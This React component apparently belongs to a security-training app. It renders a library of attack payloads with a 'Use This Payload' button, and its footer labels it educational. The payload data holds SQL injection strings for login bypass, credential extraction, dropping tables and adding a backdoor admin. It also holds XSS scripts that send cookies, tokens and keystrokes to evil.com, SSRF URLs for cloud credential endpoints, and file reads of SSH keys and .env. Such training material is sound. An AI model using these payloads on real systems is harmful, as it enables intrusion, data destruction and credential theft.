import React, { useState } from 'react';

interface PayloadCategory {
  name: string;
  description: string;
  payloads: {
    name: string;
    payload: string;
    description: string;
    severity: 'low' | 'medium' | 'high' | 'critical';
  }[];
}

interface PayloadLibraryProps {
  vulnerabilityType: string;
  onSelectPayload: (payload: string) => void;
  onClose: () => void;
}

export const PayloadLibrary: React.FC<PayloadLibraryProps> = ({
  vulnerabilityType,
  onSelectPayload,
  onClose
}) => {
  const [selectedCategory, setSelectedCategory] = useState(0);

  const getPayloadCategories = (): PayloadCategory[] => {
    switch (vulnerabilityType) {
      case 'sqlInjection':
        return [
          {
            name: 'Authentication Bypass',
            description: 'Payloads to bypass login authentication',
            payloads: [
              {
                name: 'Basic OR Injection',
                payload: "' OR '1'='1",
                description: 'Makes WHERE clause always true',
                severity: 'high'
              },
              {
                name: 'Admin Login Bypass',
                payload: "admin'--",
                description: 'Comments out password check',
                severity: 'critical'
              },
              {
                name: 'Universal Login',
                payload: "' OR 1=1#",
                description: 'MySQL comment syntax',
                severity: 'high'
              }
            ]
          },
          {
            name: 'Data Extraction',
            description: 'UNION-based payloads for data extraction',
            payloads: [
              {
                name: 'User Credentials',
                payload: "' UNION SELECT id, email, password_hash FROM users--",
                description: 'Extract user credentials',
                severity: 'critical'
              },
              {
                name: 'Database Schema',
                payload: "' UNION SELECT table_name, column_name, data_type FROM information_schema.columns--",
                description: 'Discover database structure',
                severity: 'medium'
              },
              {
                name: 'All Tables',
                payload: "' UNION SELECT table_name, NULL, NULL FROM information_schema.tables--",
                description: 'List all database tables',
                severity: 'medium'
              }
            ]
          },
          {
            name: 'Destructive Attacks',
            description: 'Payloads that modify or delete data',
            payloads: [
              {
                name: 'Drop Table',
                payload: "'; DROP TABLE tasks; --",
                description: 'Delete entire tasks table',
                severity: 'critical'
              },
              {
                name: 'Update All Records',
                payload: "'; UPDATE users SET password_hash='hacked' WHERE '1'='1'; --",
                description: 'Modify all user passwords',
                severity: 'critical'
              },
              {
                name: 'Insert Admin User',
                payload: "'; INSERT INTO users (email, password_hash, role) VALUES ('hacker@evil.com', 'hash', 'admin'); --",
                description: 'Create backdoor admin account',
                severity: 'critical'
              }
            ]
          }
        ];

      case 'xss':
        return [
          {
            name: 'Basic XSS',
            description: 'Simple script execution payloads',
            payloads: [
              {
                name: 'Alert Box',
                payload: "<script>alert('XSS')</script>",
                description: 'Basic XSS proof of concept',
                severity: 'low'
              },
              {
                name: 'Image Error',
                payload: "<img src=x onerror='alert(\"XSS via image error\")'>",
                description: 'XSS via broken image tag',
                severity: 'medium'
              },
              {
                name: 'SVG Onload',
                payload: "<svg onload='alert(\"XSS via SVG\")'></svg>",
                description: 'XSS using SVG element',
                severity: 'medium'
              }
            ]
          },
          {
            name: 'Session Hijacking',
            description: 'Payloads to steal user sessions',
            payloads: [
              {
                name: 'Cookie Theft',
                payload: "<script>fetch('/evil.com/steal?cookie='+document.cookie)</script>",
                description: 'Send cookies to attacker server',
                severity: 'critical'
              },
              {
                name: 'Token Extraction',
                payload: "<script>fetch('/evil.com/token?data='+localStorage.getItem('token'))</script>",
                description: 'Extract JWT token from localStorage',
                severity: 'critical'
              },
              {
                name: 'Session Storage Theft',
                payload: "<script>fetch('/evil.com/session?data='+JSON.stringify(sessionStorage))</script>",
                description: 'Steal all session storage data',
                severity: 'high'
              }
            ]
          },
          {
            name: 'Advanced Attacks',
            description: 'Complex XSS attack vectors',
            payloads: [
              {
                name: 'Keylogger',
                payload: "<script>document.onkeypress=function(e){fetch('/evil.com/keys?key='+e.key)}</script>",
                description: 'Log all keystrokes',
                severity: 'critical'
              },
              {
                name: 'Form Hijacking',
                payload: "<script>document.forms[0].action='http://evil.com/steal'</script>",
                description: 'Redirect form submissions',
                severity: 'high'
              },
              {
                name: 'Page Defacement',
                payload: "<script>document.body.innerHTML='<h1 style=\"color:red\">HACKED!</h1>'</script>",
                description: 'Replace page content',
                severity: 'medium'
              }
            ]
          }
        ];

      case 'idor':
        return [
          {
            name: 'Object Enumeration',
            description: 'Techniques to enumerate object IDs',
            payloads: [
              {
                name: 'Sequential ID Testing',
                payload: 'Increment task ID: /api/tasks/123 → /api/tasks/124',
                description: 'Test sequential object identifiers',
                severity: 'medium'
              },
              {
                name: 'Bulk Enumeration',
                payload: 'Automated scan: /api/tasks/1 through /api/tasks/1000',
                description: 'Systematically test large ID ranges',
                severity: 'high'
              },
              {
                name: 'Admin Object Access',
                payload: 'Access admin resources: /api/tasks/1 (likely admin task)',
                description: 'Target low-numbered IDs for admin data',
                severity: 'high'
              }
            ]
          },
          {
            name: 'Privilege Escalation',
            description: 'Access higher privilege resources',
            payloads: [
              {
                name: 'User Profile Access',
                payload: 'Access other profiles: /api/users/456',
                description: 'View other users\' profile information',
                severity: 'high'
              },
              {
                name: 'Administrative Functions',
                payload: 'Admin panel access: /api/admin/users',
                description: 'Access administrative endpoints',
                severity: 'critical'
              },
              {
                name: 'System Configuration',
                payload: 'Config access: /api/system/config',
                description: 'Access system configuration',
                severity: 'critical'
              }
            ]
          }
        ];

      case 'sessionManagement':
        return [
          {
            name: 'Token Manipulation',
            description: 'JWT and session token attacks',
            payloads: [
              {
                name: 'JWT None Algorithm',
                payload: 'Change alg to "none" in JWT header',
                description: 'Remove signature verification',
                severity: 'critical'
              },
              {
                name: 'JWT Secret Brute Force',
                payload: 'jwt_tool -C -d wordlist.txt <token>',
                description: 'Crack weak JWT secrets',
                severity: 'high'
              },
              {
                name: 'Token Replay',
                payload: 'Reuse old tokens after logout',
                description: 'Test token invalidation',
                severity: 'medium'
              }
            ]
          },
          {
            name: 'Session Fixation',
            description: 'Force users to use attacker sessions',
            payloads: [
              {
                name: 'Pre-login Session',
                payload: 'Set session ID before authentication',
                description: 'Force user to use known session',
                severity: 'high'
              },
              {
                name: 'Cross-site Session',
                payload: 'Inject session via XSS or CSRF',
                description: 'Set session from malicious site',
                severity: 'high'
              }
            ]
          }
        ];

      case 'ssrfLfi':
        return [
          {
            name: 'Cloud Metadata',
            description: 'Access cloud provider metadata services',
            payloads: [
              {
                name: 'AWS Metadata',
                payload: 'http://169.254.169.254/latest/meta-data/',
                description: 'Access AWS EC2 metadata service',
                severity: 'critical'
              },
              {
                name: 'AWS Credentials',
                payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                description: 'Extract AWS IAM credentials',
                severity: 'critical'
              },
              {
                name: 'GCP Metadata',
                payload: 'http://metadata.google.internal/computeMetadata/v1/',
                description: 'Access Google Cloud metadata',
                severity: 'critical'
              }
            ]
          },
          {
            name: 'Internal Services',
            description: 'Scan and access internal network services',
            payloads: [
              {
                name: 'Redis Access',
                payload: 'http://localhost:6379/info',
                description: 'Access Redis database info',
                severity: 'high'
              },
              {
                name: 'Elasticsearch',
                payload: 'http://localhost:9200/_cluster/health',
                description: 'Access Elasticsearch cluster info',
                severity: 'medium'
              },
              {
                name: 'Internal Admin',
                payload: 'http://internal-admin:8080/admin',
                description: 'Access internal admin panels',
                severity: 'high'
              }
            ]
          },
          {
            name: 'Local File Inclusion',
            description: 'Read local system files',
            payloads: [
              {
                name: 'System Passwords',
                payload: 'file:///etc/passwd',
                description: 'Read system user accounts',
                severity: 'high'
              },
              {
                name: 'SSH Keys',
                payload: 'file:///home/user/.ssh/id_rsa',
                description: 'Extract SSH private keys',
                severity: 'critical'
              },
              {
                name: 'Application Config',
                payload: 'file:///app/.env',
                description: 'Read application configuration',
                severity: 'critical'
              }
            ]
          }
        ];

      default:
        return [];
    }
  };

  const categories = getPayloadCategories();

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case 'low': return 'bg-yellow-100 text-yellow-800';
      case 'medium': return 'bg-orange-100 text-orange-800';
      case 'high': return 'bg-red-100 text-red-800';
      case 'critical': return 'bg-purple-100 text-purple-800';
      default: return 'bg-gray-100 text-gray-800';
    }
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div className="bg-white rounded-lg shadow-xl max-w-4xl w-full mx-4 max-h-[90vh] overflow-hidden">
        {/* Header */}
        <div className="p-6 border-b">
          <div className="flex items-center justify-between">
            <h2 className="text-2xl font-bold text-gray-900">
              📚 Payload Library - {vulnerabilityType.toUpperCase()}
            </h2>
            <button
              onClick={onClose}
              className="text-gray-400 hover:text-gray-600 text-2xl"
            >
              ×
            </button>
          </div>
          <p className="mt-2 text-gray-600">
            Pre-configured attack payloads for testing and learning
          </p>
        </div>

        <div className="flex h-[70vh]">
          {/* Category Sidebar */}
          <div className="w-1/3 border-r bg-gray-50 overflow-y-auto">
            <div className="p-4">
              <h3 className="font-semibold text-gray-900 mb-3">Categories</h3>
              <div className="space-y-2">
                {categories.map((category, index) => (
                  <button
                    key={index}
                    onClick={() => setSelectedCategory(index)}
                    className={`
                      w-full text-left p-3 rounded-lg transition-colors
                      ${selectedCategory === index
                        ? 'bg-blue-100 border-blue-200 text-blue-900'
                        : 'bg-white border-gray-200 text-gray-700 hover:bg-gray-50'
                      } border
                    `}
                  >
                    <div className="font-medium">{category.name}</div>
                    <div className="text-sm text-gray-600 mt-1">
                      {category.description}
                    </div>
                    <div className="text-xs text-gray-500 mt-1">
                      {category.payloads.length} payloads
                    </div>
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* Payload List */}
          <div className="flex-1 overflow-y-auto">
            <div className="p-4">
              {categories[selectedCategory] && (
                <>
                  <h3 className="font-semibold text-gray-900 mb-1">
                    {categories[selectedCategory].name}
                  </h3>
                  <p className="text-gray-600 mb-4">
                    {categories[selectedCategory].description}
                  </p>
                  
                  <div className="space-y-3">
                    {categories[selectedCategory].payloads.map((payload, index) => (
                      <div
                        key={index}
                        className="bg-white border border-gray-200 rounded-lg p-4 hover:shadow-sm transition-shadow"
                      >
                        <div className="flex items-start justify-between mb-2">
                          <h4 className="font-medium text-gray-900">{payload.name}</h4>
                          <span className={`px-2 py-1 rounded text-xs font-medium ${getSeverityColor(payload.severity)}`}>
                            {payload.severity.toUpperCase()}
                          </span>
                        </div>
                        
                        <p className="text-sm text-gray-600 mb-3">{payload.description}</p>
                        
                        <div className="bg-gray-50 rounded p-3 mb-3">
                          <code className="text-sm font-mono text-gray-800 break-all">
                            {payload.payload}
                          </code>
                        </div>
                        
                        <button
                          onClick={() => onSelectPayload(payload.payload)}
                          className="w-full px-3 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded text-sm font-medium transition-colors"
                        >
                          Use This Payload
                        </button>
                      </div>
                    ))}
                  </div>
                </>
              )}
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="p-4 border-t bg-gray-50">
          <div className="flex items-center justify-between">
            <div className="text-sm text-gray-600">
              ⚠️ These payloads are for educational purposes only. Use responsibly in authorized testing environments.
            </div>
            <button
              onClick={onClose}
              className="px-4 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded font-medium transition-colors"
            >
              Close
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};